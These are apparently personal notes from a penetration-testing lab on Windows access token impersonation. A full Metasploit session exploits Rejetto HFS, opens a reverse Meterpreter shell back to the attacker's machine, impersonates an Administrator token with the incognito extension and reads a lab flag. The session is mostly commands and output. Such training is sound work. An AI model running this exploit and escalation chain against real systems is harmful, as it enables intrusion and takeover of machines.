# Access Token Impersonation

**Access Token**\
In Windows, access token is like and **ID card** for a process.\
It tells the system *who I am (user),what group I belong* and *what permissions I have*.

**Token Impersonation**\
If a privileged process or service allows impersonation, I might be able to hijack their token.\
For example, if a service is running as SYSTEM and allows impersonation, I can elevate to SYSTEM.

### Tools
**rejetto** module\
Is used to exploit a vulnerability in the **Rejetto HTTP File Server (HFS)**\
It targets vulnerable versions of HFS and **execute remote commands** on the server by abusing a feature in HFS that misinterprets certain HTTP requests.

**pgrep explorer** command\
`pgrep` stands for "**process grep**" - it serches for processes by name.\
`explorer` is the name o the process I'm looking for -  specifically `explorer.exe` which is the main **desktop interface and user shell** in Windows

**load incognito** command\
Is a **Meterpreter command** that loads the **Incognito extension** - this lets me **play with Windows access tokens**.\
**Steps** (simply)\
Load extension -> List available tokens -> Impersonate


### Practice
```bash
# start Metasploit
msf6 > search rejetto
msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.0.29.63
RHOSTS => 10.0.29.63

# Run the module
msf6 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.10.38.2:4444 
[*] Using URL: http://10.10.38.2:8080/U9MNFV1p66
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /U9MNFV1p66
[*] Sending stage (176198 bytes) to 10.0.29.63
[!] Tried to delete %TEMP%\EMQqYsRFbGsT.vbs, unknown result
[*] Meterpreter session 1 opened (10.10.38.2:4444 -> 10.0.29.63:49755) at 2025-07-17 06:54:50 +0530
[*] Server stopped.

# Check the privilege 
meterpreter > sysinfo
Computer        : ATTACKDEFENSE
OS              : Windows Server 2019 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Meterpreter     : x86/windows
meterpreter > getuid
Server username: NT AUTHORITY\LOCAL SERVICE    <- Here!

# Seach explorer.exe process
meterpreter > pgrep explorer
4000

# Migration failed because I don't have privilege to do
meterpreter > migrate 4000
[*] Migrating from 4952 to 4000...
[-] core_migrate: Operation failed: Access is denied.
```

```bash
# Check available privileges
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeSystemtimePrivilege
SeTimeZonePrivilege

# If loading failed, run the module again
meterpreter > load incognito
Loading extension incognito...
[*] 10.0.29.63 - Meterpreter session 1 closed.  Reason: Died

[-] Failed to load extension: No response was received to the core_loadlib request.

msf6 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.10.38.2:4444 
[*] Using URL: http://10.10.38.2:8080/lDHtPgFg5
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /lDHtPgFg5
[*] Sending stage (176198 bytes) to 10.0.29.63
[!] Tried to delete %TEMP%\YYzmOWa.vbs, unknown result
[*] Meterpreter session 2 opened (10.10.38.2:4444 -> 10.0.29.63:49780) at 2025-07-17 06:58:48 +0530
[*] Server stopped.

# Load extension
meterpreter > load incognito
Loading extension incognito...Success.

# List available tokens
meterpreter > list_tokens -u
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
ATTACKDEFENSE\Administrator      <- Administrator token!
NT AUTHORITY\LOCAL SERVICE

Impersonation Tokens Available
========================================
No tokens available

# Impersonate the token
meterpreter > impersonate_token "ATTACKDEFENSE\Administrator"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user ATTACKDEFENSE\Administrator

# Seccess
meterpreter > getuid
Server username: ATTACKDEFENSE\Administrator

meterpreter > getuid
Server username: ATTACKDEFENSE\Administrator
meterpreter > getprivs
[-] stdapi_sys_config_getprivs: Operation failed: Access is denied.

# Try to migrate session again
meterpreter > pgrep explorer
4000
meterpreter > migrate 4000
[*] Migrating from 1640 to 4000...
[*] Migration completed successfully.

meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeDelegateSessionUserImpersonatePrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

# Successfully impersonated privilege
```
Find the flag
```bash
C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9E32-0E96

 Directory of C:\Users\Administrator\Desktop

04/22/2021  06:37 AM    <DIR>          .
04/22/2021  06:37 AM    <DIR>          ..
04/22/2021  07:27 AM                32 flag.txt
               1 File(s)             32 bytes
               2 Dir(s)  16,054,771,712 bytes free

C:\Users\Administrator\Desktop>get flag.txt
get flag.txt
'get' is not recognized as an internal or external command,
operable program or batch file.

meterpreter > cat C:\\Users\\Administrator\\Desktop\\flag.txt
x28c832a39730b7d46d6c38f1ea18e12meterpreter > 
```